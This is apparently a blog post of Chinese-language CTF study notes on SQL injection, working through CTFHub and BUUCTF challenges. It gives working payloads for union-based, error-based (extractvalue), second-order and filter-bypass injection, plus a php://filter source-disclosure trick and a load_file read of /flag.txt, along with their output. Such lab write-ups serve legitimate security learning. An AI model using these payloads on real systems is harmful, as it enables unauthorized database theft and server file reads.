---
layout: default
title: CTF Learning Notes 2
categories:
- Security
tags:
- Security
---
//Description: 

//Create Date: 2025-08-13 09:04:20

//Author: channy

[toc]

# 参考书籍 
[CTF实战：技术、解题与进阶]

题目在 [CTFHub](https://www.ctfhub.com/#/index)　和　[BUUCTF](https://buuoj.cn/challenges)

# [SQL]
## 整数型注入
> union内部的每个select语句必须拥有相同数量的列。
```sql
-- 确认列数：order by / union

select * from xxx where id=-1 order by 3   --3列

select * from xxx where id=-1 union select 1,2,3   --3列
```
> 回显只能显示一条数据的情况时，可以通过group_concat()函数将多条数据组合成字符串并输出，或者通过limit函数选择输出第几条数据。  
> MySQL5.0以上的版本中，有一个名为information_schema的默认数据库，里面存放着所有数据库的信息，比如表名、列名、对应权限等
```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
-- Data: information_schema,performance_schema,mysql,sqli
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
-- Data: news,flag 
-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'
Data: flag 
-1 union select 1,flag from sqli.flag
-- Data: ctfhub{cccd760851d6d8b64d74a6ec} 
```
## 字符型注入
使用`--`注释不成功，换成`#`才好。。。
```sql
1' and 1=2 union select 1, group_concat(schema_name) from information_schema.schemata#
-- Data: information_schema,performance_schema,mysql,sqli
1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#
-- Data: news,flag
1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'#
-- Data: flag
1' and 1=2 union select 1,flag from sqli.flag#
```
## 报错注入
```sql
1 or extractvalue(1, (select database()) )
-- 查询正确 
1 or extractvalue(1, concat(0x7e, (SELECT database()) ))
-- 查询错误: XPATH syntax error: '~sqli' 
1 or extractvalue(1, concat(0x7e, (select group_concat(schema_name) from information_schema.schemata) ))

1 or extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli') ))
-- 查询错误: XPATH syntax error: '~news,flag' 
1 or extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag')))
-- 查询错误: XPATH syntax error: '~flag' 
1 or extractvalue(1, concat(0x7e, (select flag from sqli.flag)))
-- 查询错误: XPATH syntax error: '~ctfhub{ededf8c215f60ebdbc61340b' 
1 or extractvalue(1, concat(0x7e, substr((select flag from sqli.flag), 32)))
-- 查询错误: XPATH syntax error: '~}' 
```
## Bool盲注
数据库名称、表名和列名 [a-zA-Z0-9_]
## 时间盲注
## [二次注入](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk)
```sh
file=php://filter/convert.base64-encode/resource=index.php
```
```py
import base64
s = base64.b64decode(s)
```
得到网页源码。
```
',`address`=(select(load_file("/flag.txt")))#
```
## [无列名注入](https://buuoj.cn/challenges#[SWPU2019]Web1)
在“发布广告”中尝试注入然后查看显示的“广告名”和“内容”可以判断过滤掉了空格(%20)、注释`--`和`#`、`or`、`information_schema`等，改用`/**/`替代空格。先确定列数，可以使用`group by`
```sql
1'/**/group/**/by/**/3,'2
```
当到23时点击“广告详情”有报错信息，确认列数为22。
```sql
1'/**/union/**/select/**/1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
-- You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' limit 0,1' at line 1
1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
-- 2,3列分别是广告名和广告内容
1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
-- web1
1'union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='web1'&&'1'='1
-- ads,users
-- 无列名注入，发现a={1,1,2,3}、b无意义，c有flag
1'union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
```
## [堆叠注入](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)

